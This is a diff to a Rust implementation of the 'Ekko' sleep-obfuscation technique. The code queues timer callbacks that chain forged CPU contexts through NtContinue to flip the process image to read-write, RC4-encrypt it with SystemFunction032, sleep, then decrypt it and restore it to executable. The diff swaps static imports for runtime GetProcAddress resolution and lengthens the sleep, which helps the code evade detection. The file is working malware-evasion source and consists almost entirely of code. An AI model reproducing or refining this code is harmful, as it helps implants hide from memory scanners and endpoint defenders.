@@ -2,25 +2,21 @@
 use ntapi::ntexapi::NtCreateEvent;
 use ntapi::ntobapi::{NtSignalAndWaitForSingleObject, NtWaitForSingleObject};
 use ntapi::ntrtl::{RtlCreateTimerQueue, RtlDeleteTimerQueue};
-use ntapi::ntxcapi::NtContinue;
 use ntapi::winapi::ctypes::c_void;
 use std::arch::x86_64::_rdrand32_step;
 use std::ptr::null_mut;
 use windows_sys::Win32::Foundation::{CloseHandle, NTSTATUS};
-use windows_sys::Win32::System::Diagnostics::Debug::{RtlCaptureContext, WaitForDebugEvent};
 use windows_sys::Win32::System::Kernel::NotificationEvent;
 use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
-use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualProtect};
+use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, PAGE_READWRITE};
 use windows_sys::Win32::System::Threading::{
-    EVENT_ALL_ACCESS, GetCurrentProcess, INFINITE, WT_EXECUTEINTIMERTHREAD, WaitForSingleObject,
-    WaitForSingleObjectEx,
+    EVENT_ALL_ACCESS, GetCurrentProcess, INFINITE, WT_EXECUTEINTIMERTHREAD, WT_EXECUTEONLYONCE,
 };
 use windows_sys::Win32::System::{
     Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64},
     LibraryLoader::GetModuleHandleA,
     SystemServices::IMAGE_DOS_HEADER,
 };
-use windows_sys::core::BOOL;
 
 unsafe extern "system" {
     fn RtlCreateTimer(
@@ -32,13 +28,13 @@ unsafe extern "system" {
         Period: u32,
         Flags: u32,
     ) -> NTSTATUS;
-    fn SetEvent(hevent: *mut c_void) -> BOOL;
 }
 
 fn nt_success(status: NTSTATUS) -> bool {
     status >= 0
 }
 
+#[repr(C)]
 struct STRING {
     len: u32,
     max_len: u32,
@@ -72,17 +68,41 @@ fn ekko(time: u32) {
             (image_base as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
         let image_size = (*nt_header).OptionalHeader.SizeOfImage as usize;
 
+        let kernel32 = LoadLibraryA("kernel32.dll\0".as_ptr() as *const u8);
+
+        let ntdll = LoadLibraryA("ntdll.dll\0".as_ptr() as *const u8);
+
         let advapi32 = LoadLibraryA("advapi32.dll\0".as_ptr() as *const u8);
-        if advapi32.is_null() {
-            println!("[-] Failed to load advapi32.dll");
+
+        if advapi32.is_null() || ntdll.is_null() || kernel32.is_null() {
+            println!("[-] Failed to load DLLs");
             return;
         }
+
+        let wait_for_single_object_ex =
+            GetProcAddress(kernel32, "WaitForSingleObjectEx\0".as_ptr() as *const u8).unwrap()
+                as *mut c_void;
+        let virtual_protect = GetProcAddress(kernel32, "VirtualProtect\0".as_ptr() as *const u8)
+            .unwrap() as *mut c_void;
+        let set_event =
+            GetProcAddress(kernel32, "SetEvent\0".as_ptr() as *const u8).unwrap() as *mut c_void;
+        let nt_continue =
+            GetProcAddress(ntdll, "NtContinue\0".as_ptr() as *const u8).unwrap() as *mut c_void;
+        let rtl_capture_context = GetProcAddress(ntdll, "RtlCaptureContext\0".as_ptr() as *const u8)
+            .unwrap() as *mut c_void;
 
         let systemfunction032 =
             GetProcAddress(advapi32, "SystemFunction032\0".as_ptr() as *const u8).unwrap()
                 as *mut c_void;
-        if systemfunction032.is_null() {
-            println!("[-] Failed to get address of SystemFunction032");
+
+        if wait_for_single_object_ex.is_null()
+            || virtual_protect.is_null()
+            || set_event.is_null()
+            || nt_continue.is_null()
+            || rtl_capture_context.is_null()
+            || systemfunction032.is_null()
+        {
+            println!("[-] Failed to resolve functions");
             return;
         }
 
@@ -136,21 +156,21 @@ fn ekko(time: u32) {
         if nt_success(RtlCreateTimer(
             queue,
             &mut timer as *mut _ as *mut _,
-            RtlCaptureContext as *const _,
+            rtl_capture_context as *const _,
             &mut ctx_init as *mut _ as *const _,
             delay,
             0,
-            WT_EXECUTEINTIMERTHREAD,
+            WT_EXECUTEINTIMERTHREAD | WT_EXECUTEONLYONCE,
         )) {
             delay += 100;
             if nt_success(RtlCreateTimer(
                 queue,
                 &mut timer,
-                SetEvent as *const _,
+                set_event as *const _,
                 event_timer as *mut _,
                 delay,
                 0,
-                WT_EXECUTEINTIMERTHREAD,
+                WT_EXECUTEINTIMERTHREAD | WT_EXECUTEONLYONCE,
             )) {
                 if !nt_success(NtWaitForSingleObject(event_timer, 0, null_mut())) {
                     println!("[-] Failed to wait for event timer");
@@ -162,37 +182,37 @@ fn ekko(time: u32) {
                     ctx[i].Rsp -= 8;
                 }
 
-                ctx[0].Rip = WaitForSingleObjectEx as u64;
+                ctx[0].Rip = wait_for_single_object_ex as *const () as u64;
                 ctx[0].Rcx = event_start as u64;
                 ctx[0].Rdx = INFINITE as u64;
                 ctx[0].R8 = 0;
 
-                ctx[1].Rip = VirtualProtect as u64;
+                ctx[1].Rip = virtual_protect as *const () as u64;
                 ctx[1].Rcx = image_base as u64;
                 ctx[1].Rdx = image_size as u64;
                 ctx[1].R8 = PAGE_READWRITE as u64;
                 ctx[1].R9 = &mut value as *mut _ as u64;
 
-                ctx[2].Rip = systemfunction032 as u64;
+                ctx[2].Rip = systemfunction032 as *const () as u64;
                 ctx[2].Rcx = &mut image as *mut _ as u64;
                 ctx[2].Rdx = &mut key_buffer as *mut _ as u64;
 
-                ctx[3].Rip = WaitForSingleObjectEx as u64;
+                ctx[3].Rip = wait_for_single_object_ex as *const () as u64;
                 ctx[3].Rcx = GetCurrentProcess() as u64;
                 ctx[3].Rdx = time as u64;
                 ctx[3].R8 = 0;
 
-                ctx[4].Rip = systemfunction032 as u64;
+                ctx[4].Rip = systemfunction032 as *const () as u64;
                 ctx[4].Rcx = &mut image as *mut _ as u64;
                 ctx[4].Rdx = &mut key_buffer as *mut _ as u64;
 
-                ctx[5].Rip = VirtualProtect as u64;
+                ctx[5].Rip = virtual_protect as *const () as u64;
                 ctx[5].Rcx = image_base as u64;
                 ctx[5].Rdx = image_size as u64;
                 ctx[5].R8 = PAGE_EXECUTE_READ as u64;
                 ctx[5].R9 = &mut value as *mut _ as u64;
 
-                ctx[6].Rip = SetEvent as u64;
+                ctx[6].Rip = set_event as *const () as u64;
                 ctx[6].Rcx = event_end as u64;
 
                 for i in 0..7 {
@@ -200,7 +220,7 @@ fn ekko(time: u32) {
                     if !nt_success(RtlCreateTimer(
                         queue,
                         &mut timer,
-                        NtContinue as *const _,
+                        nt_continue as *const _,
                         &mut ctx[i] as *mut _ as *const _,
                         delay,
                         0,
@@ -233,6 +253,6 @@ fn ekko(time: u32) {
 
 fn main() {
     loop {
-        ekko(1000);
+        ekko(3000);
     }
 }
